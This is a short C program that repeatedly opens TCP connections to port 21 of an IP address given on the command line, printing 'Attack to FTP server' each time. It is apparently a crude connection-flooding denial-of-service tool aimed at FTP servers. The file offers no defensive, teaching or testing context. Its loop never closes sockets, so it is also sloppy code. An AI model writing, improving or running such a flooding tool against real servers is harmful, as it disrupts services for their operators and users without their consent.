#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

#define BUFFER_SIZE 1024

void connectToFTP(const char *ip_address, int port) {
    while(1){    
        int sockfd;
        struct sockaddr_in server_addr;
        char buffer[BUFFER_SIZE];

        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            perror("Error creating socket");
            exit(1);
        }

        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        if (inet_pton(AF_INET, ip_address, &(server_addr.sin_addr)) <= 0) {
            perror("Error converting IP address");
            exit(1);
        }



        if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Error connecting to FTP server");
            exit(1);
        }

        printf("Attack to FTP server at %s:%d\n", ip_address, port);
        
        }

}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Please provide an IP address as an argument.\n");
        return 0;
    }

    const char *ip_address = argv[1];
    int ftp_port = 21; // FTP default port

    connectToFTP(ip_address, ftp_port);

    return 0;
}
